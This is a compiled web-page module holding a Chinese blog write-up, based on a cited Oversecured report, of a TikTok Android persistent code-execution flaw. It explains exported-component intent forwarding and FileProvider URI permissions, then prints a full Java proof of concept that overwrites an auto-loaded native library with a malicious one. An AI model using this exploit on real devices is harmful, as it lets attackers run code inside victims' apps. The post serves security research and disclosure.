import{o as n,c as a,e as s}from"./app.d2d52540.js";const t='{"title":"Tiktok持久任意代码执行漏洞","description":"","frontmatter":{"title":"Tiktok持久任意代码执行漏洞","date":"2022-01-14T13:57:03.000Z","hide":false,"tags":["security","app","android","tiktok"],"categories":["技术相关"]},"headers":[{"level":2,"title":"持久CE的前提","slug":"持久ce的前提"},{"level":2,"title":"任意文件读写的漏洞","slug":"任意文件读写的漏洞"},{"level":3,"title":"NotificationBroadcastReceiver","slug":"notificationbroadcastreceiver"},{"level":3,"title":"是否有自动加载so文件地方呢?","slug":"是否有自动加载so文件地方呢"},{"level":2,"title":"完整的poc","slug":"完整的poc"},{"level":2,"title":"另一个持久CE的漏洞","slug":"另一个持久ce的漏洞"}],"relativePath":"app_security/tiktok_arbitrary_code_execution.md","lastUpdated":1643422876966}',p={},e=[s('<h2 id="持久ce的前提"><a class="header-anchor" href="#持久ce的前提" aria-hidden="true">#</a> 持久CE的前提</h2><p>想要实现持久的CE,就必须能够覆盖app自动加载的so文件,而titok的这个漏洞就满足这个要求:</p><ol><li>tiktok 会从指定目录加载so文件</li><li>存在外部读写该目录的漏洞</li></ol><h2 id="任意文件读写的漏洞"><a class="header-anchor" href="#任意文件读写的漏洞" aria-hidden="true">#</a> 任意文件读写的漏洞</h2><h3 id="notificationbroadcastreceiver"><a class="header-anchor" href="#notificationbroadcastreceiver" aria-hidden="true">#</a> NotificationBroadcastReceiver</h3><p>这个导出组件存在<a href="./android_howto_protected_unexported_components.html">如何保护导出组件</a>一文描述的可以访问启动内部未导出组件的漏洞.</p><p><img alt="" data-src="assets/tiktok_notification_broadcast_receiver_manfiest.png.png" loading="lazy" class="lazy"><img alt="" data-src="assets/tiktok_broadcast_receiver.png" loading="lazy" class="lazy"></p><p>同时还存在着未导出的FileProvider,可以对外提供任意文件读写的服务.</p><h4 id="fileprovider"><a class="header-anchor" href="#fileprovider" aria-hidden="true">#</a> FileProvider</h4><div class="language-xml line-numbers-mode"><pre><code>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>provider</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.support.v4.content.FileProvider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>authorities</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.zhiliaoapp.musically.fileprovider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>grantUriPermissions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta-data</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.support.FILE_PROVIDER_PATHS<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>@xml/k86<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>provider</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>可以看到<a href="./android_howto_protected_unexported_components.html">如何保护导出组件</a>提到的关键标志: <code>android:grantUriPermissions=&quot;true&quot;</code>. 因此也就意味着tiktok发出的Intent中只要带有<code>Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code>标志,接收者就自动获得了相关文件的读写权限.</p><h3 id="是否有自动加载so文件地方呢"><a class="header-anchor" href="#是否有自动加载so文件地方呢" aria-hidden="true">#</a> 是否有自动加载so文件地方呢?</h3><p>经过排查,发现确实存在着的地方 <img alt="" data-src="assets/load_so1.png.png" loading="lazy" class="lazy"> 经过测试,选定<code>/data/user/0/com.zhiliaoapp.musically/app_librarian/14.7.5.6172264464/libAkeva.so</code>,覆盖这个so文件的好处:</p><ol><li>会自动被加载</li><li>这个文件几乎不被使用,所以不影响tiktok的正常运行.</li></ol><h2 id="完整的poc"><a class="header-anchor" href="#完整的poc" aria-hidden="true">#</a> 完整的poc</h2><div class="language-java line-numbers-mode"><pre><code>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token function">handleIntent</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onNewIntent</span><span class="token punctuation">(</span><span class="token class-name">Intent</span> intent<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onNewIntent</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token function">handleIntent</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">handleIntent</span><span class="token punctuation">(</span><span class="token class-name">Intent</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">&quot;evil&quot;</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token class-name">Intent</span> next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token string">&quot;evil&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            next<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token function">getPackageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCanonicalName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            next<span class="token punctuation">.</span><span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_PERSISTABLE_URI_PERMISSION <span class="token operator">|</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_WRITE_URI_PERMISSION<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            next<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">&quot;content://com.zhiliaoapp.musically.fileprovider/name/data/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n            <span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token string">&quot;notification_clicked&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            intent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.zhiliaoapp.musically&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            intent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;contentIntentURI&quot;</span><span class="token punctuation">,</span> next<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token function">sendBroadcast</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token keyword">else</span> <span class="token punctuation">{</span>\n            <span class="token keyword">try</span> <span class="token punctuation">{</span>\n                <span class="token class-name">OutputStream</span> o <span class="token operator">=</span> <span class="token function">getContentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openOutputStream</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token function">getAssets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span><span class="token string">&quot;evil_lib.so&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                <span class="token class-name">IOUtils</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>in<span class="token punctuation">,</span> o<span class="token punctuation">)</span><span class="token punctuation">;</span>\n                inp<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                o<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> th<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>th<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><p>poc 的思路也很巧妙,发送Intent给<code>NotificationBroadcastReceiver</code>,然后<code>NotificationBroadcastReceiver</code>通过<code>startActivity</code>又把<code>next</code>传送给了自己,从而获得<code>/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so</code>的读写权限.</p><h2 id="另一个持久ce的漏洞"><a class="header-anchor" href="#另一个持久ce的漏洞" aria-hidden="true">#</a> 另一个持久CE的漏洞</h2><p>和上面通过<code>NotificationBroadcastReceiver</code>获得文件读写权限类似,这次是通过<code>DetailActivity</code>来实现,他也是一个导出的组件,同时没有对收到的Intent进行检查,就进行了转发.</p><p><img alt="" data-src="assets/detail_activity.png" loading="lazy" class="lazy"></p><p>至于poc则几乎和上面的完全一致,所以就不重复了.</p><p>参考文档: <a href="https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/" target="_blank" rel="noopener noreferrer">Oversecured detects dangerous vulnerabilities in the TikTok Android app</a></p>',22)];p.render=function(s,t,p,o,c,l){return n(),a("div",null,e)};export{t as __pageData,p as default};
